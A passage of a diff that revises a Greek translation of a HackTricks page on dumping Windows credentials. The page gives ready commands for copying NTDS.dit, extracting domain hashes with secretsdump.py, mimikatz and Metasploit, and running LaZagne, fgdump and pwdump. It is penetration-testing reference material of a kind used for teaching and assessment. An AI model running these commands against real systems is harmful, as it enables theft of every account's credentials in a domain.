-Το **PEK** έχει την **ίδια τιμή** σε **κάθε ελεγκτή τομέα**, αλλά κρυπτογραφείται μέσα στο αρχείο **NTDS.dit** χρησιμοποιώντας το **BOOTKEY** του **αρχείου SYSTEM του ελεγκτή τομέα (διαφέρει μεταξύ των ελεγκτών τομέα)**. Για αυτόν τον λόγο, για να αποκτήσετε τα διαπιστευτήρια από το αρχείο NTDS.dit, **χρειάζεστε τα αρχεία NTDS.dit και SYSTEM** (_C:\Windows\System32\config\SYSTEM_).
+Το **PEK** έχει την **ίδια τιμή** σε **κάθε domain controller**, αλλά είναι **κρυπτογραφημένο** μέσα στο αρχείο **NTDS.dit** χρησιμοποιώντας το **BOOTKEY** του **SYSTEM file του domain controller (είναι διαφορετικό μεταξύ των domain controllers)**. Γι' αυτό για να αποκτήσετε τα διαπιστευτήρια από το αρχείο NTDS.dit **χρειάζεστε τα αρχεία NTDS.dit και SYSTEM** (_C:\Windows\System32\config\SYSTEM_).
 
 ### Αντιγραφή του NTDS.dit χρησιμοποιώντας το Ntdsutil
 
@@ -319,37 +238,37 @@ Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c
 ```bash
 ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
 ```
-Μπορείτε επίσης να χρησιμοποιήσετε το κόλπο του [**volume shadow copy**](./#stealing-sam-and-system) για να αντιγράψετε το αρχείο **ntds.dit**. Θυμηθείτε ότι θα χρειαστείτε επίσης ένα αντίγραφο του αρχείου **SYSTEM** (ξαναχρησιμοποιήστε τον κόλπο του [**dump it from the registry or use the volume shadow copy**](./#stealing-sam-and-system)).
+Μπορείτε επίσης να χρησιμοποιήσετε το κόλπο [**volume shadow copy**](./#stealing-sam-and-system) για να αντιγράψετε το αρχείο **ntds.dit**. Θυμηθείτε ότι θα χρειαστείτε επίσης ένα αντίγραφο του **SYSTEM file** (πάλι, [**dump it from the registry or use the volume shadow copy**](./#stealing-sam-and-system) trick).
 
-### **Εξαγωγή κατακερματισμένων τιμών από το NTDS.dit**
+### **Εξαγωγή hashes από το NTDS.dit**
 
-Αφού έχετε **αποκτήσει** τα αρχεία **NTDS.dit** και **SYSTEM**, μπορείτε να χρησιμοποιήσετε εργαλεία όπως το _secretsdump.py_ για να **εξάγετε τις κατακερματισμένες τιμές**:
+Μόλις έχετε **αποκτήσει** τα αρχεία **NTDS.dit** και **SYSTEM** μπορείτε να χρησιμοποιήσετε εργαλεία όπως το _secretsdump.py_ για να **εξάγετε τα hashes**:
 ```bash
 secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
 ```
-Μπορείτε επίσης να τα **εξάγετε αυτόματα** χρησιμοποιώντας έναν έγκυρο χρήστη διαχειριστή του τομέα:
+Μπορείτε επίσης να **εξάγετε αυτόματα** χρησιμοποιώντας έναν έγκυρο χρήστη domain admin:
 ```
 secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
 ```
-Για τα **μεγάλα αρχεία NTDS.dit** συνιστάται να το εξάγετε χρησιμοποιώντας το [gosecretsdump](https://github.com/c-sto/gosecretsdump).
+Για **μεγάλα NTDS.dit αρχεία** συνιστάται η εξαγωγή τους χρησιμοποιώντας [gosecretsdump](https://github.com/c-sto/gosecretsdump).
 
-Τέλος, μπορείτε επίσης να χρησιμοποιήσετε το **module metasploit**: _post/windows/gather/credentials/domain\_hashdump_ ή το **mimikatz** `lsadump::lsa /inject`
+Τέλος, μπορείτε επίσης να χρησιμοποιήσετε το **metasploit module**: _post/windows/gather/credentials/domain\_hashdump_ ή **mimikatz** `lsadump::lsa /inject`
 
-### **Εξαγωγή αντικειμένων του τομέα από το NTDS.dit σε μια βάση δεδομένων SQLite**
+### **Εξαγωγή αντικειμένων domain από το NTDS.dit σε βάση δεδομένων SQLite**
 
-Τα αντικείμενα NTDS μπορούν να εξαχθούν σε μια βάση δεδομένων SQLite με το [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Όχι μόνο εξάγονται τα μυστικά, αλλά και τα ολόκληρα αντικείμενα και οι ιδιότητές τους για περαιτέρω εξαγωγή πληροφοριών όταν έχει ήδη ανακτηθεί το αρχείο NTDS.dit.
+Τα αντικείμενα NTDS μπορούν να εξαχθούν σε βάση δεδομένων SQLite με το [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Δεν εξάγονται μόνο τα μυστικά αλλά και ολόκληρα τα αντικείμενα και τα χαρακτηριστικά τους για περαιτέρω εξαγωγή πληροφοριών όταν το ακατέργαστο αρχείο NTDS.dit έχει ήδη ανακτηθεί.
 ```
 ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
 ```
-Το `SYSTEM` hive είναι προαιρετικό, αλλά επιτρέπει την αποκρυπτογράφηση μυστικών (NT & LM hashes, πρόσθετα διαπιστευτήρια όπως καθαρό κείμενο κωδικού πρόσβασης, κλειδιά kerberos ή εμπιστοσύνης, ιστορικά κωδικών NT & LM). Μαζί με άλλες πληροφορίες, εξάγονται οι εξής δεδομένες: λογαριασμοί χρηστών και μηχανών με τα hashes τους, σημαίες UAC, χρονική σήμανση τελευταίας σύνδεσης και αλλαγής κωδικού πρόσβασης, περιγραφή λογαριασμών, ονόματα, UPN, SPN, ομάδες και αναδρομική συμμετοχή, δέντρο μονάδων οργανισμού και συμμετοχή, αξιόπιστους τομείς με τύπο εμπιστοσύνης, κατεύθυνση και χαρακτηριστικά...
+Το `SYSTEM` hive είναι προαιρετικό αλλά επιτρέπει την αποκρυπτογράφηση μυστικών (NT & LM hashes, συμπληρωματικά διαπιστευτήρια όπως κωδικοί σε απλό κείμενο, kerberos ή trust keys, ιστορικά κωδικών NT & LM). Μαζί με άλλες πληροφορίες, εξάγονται τα ακόλουθα δεδομένα: λογαριασμοί χρηστών και μηχανών με τα hashes τους, UAC flags, χρονική σήμανση για την τελευταία σύνδεση και αλλαγή κωδικού, περιγραφή λογαριασμών, ονόματα, UPN, SPN, ομάδες και αναδρομικές συμμετοχές, δέντρο οργανωτικών μονάδων και συμμετοχή, αξιόπιστοι τομείς με τύπο εμπιστοσύνης, κατεύθυνση και χαρακτηριστικά...
 
 ## Lazagne
 
-Κατεβάστε το δυαδικό αρχείο από [εδώ](https://github.com/AlessandroZ/LaZagne/releases). Μπορείτε να χρησιμοποιήσετε αυτό το δυαδικό αρχείο για να εξάγετε διαπιστευτήρια από διάφορο λογισμικό.
+Κατεβάστε το binary από [εδώ](https://github.com/AlessandroZ/LaZagne/releases). Μπορείτε να χρησιμοποιήσετε αυτό το binary για να εξάγετε διαπιστευτήρια από διάφορα λογισμικά.
 ```
 lazagne.exe all
 ```
-## Άλλα εργαλεία για την εξαγωγή διαπιστευτηρίων από τα αρχεία SAM και LSASS
+## Άλλα εργαλεία για εξαγωγή διαπιστευτηρίων από SAM και LSASS
 
 ### Windows credentials Editor (WCE)
 
@@ -357,7 +276,7 @@ lazagne.exe all
 
 ### fgdump
 
-Εξαγάγετε διαπιστευτήρια από το αρχείο SAM
+Εξαγωγή διαπιστευτηρίων από το αρχείο SAM
 ```
 You can find this binary inside Kali, just do: locate fgdump.exe
 fgdump.exe
@@ -374,20 +293,20 @@ type outpwdump
 
 Κατεβάστε το από: [http://www.tarasco.org/security/pwdump\_7](http://www.tarasco.org/security/pwdump\_7) και απλά **εκτελέστε το** και οι κωδικοί πρόσβασης θα εξαχθούν.
 
-## Αμυντικές Μέθοδοι
+## Άμυνες
 
-[**Μάθετε για μερικές προστασίες διαπιστευτηρίων εδώ.**](credentials-protections.md)
+[**Μάθετε για κάποιες προστασίες διαπιστευτηρίων εδώ.**](credentials-protections.md)
 
 <details>
 
-<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Μάθετε AWS hacking από το μηδέν μέχρι τον ήρωα με</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Άλλοι τρόποι για να υποστηρίξετε το HackTricks:
+Άλλοι τρόποι να υποστηρίξετε το HackTricks:
 
-* Αν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΠΑΚΕΤΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
+* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή **να κατεβάσετε το HackTricks σε PDF** Ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
 * Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Συμμετάσχετε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.
+* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή την [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Μοιραστείτε τα hacking κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο github.
 
 </details>
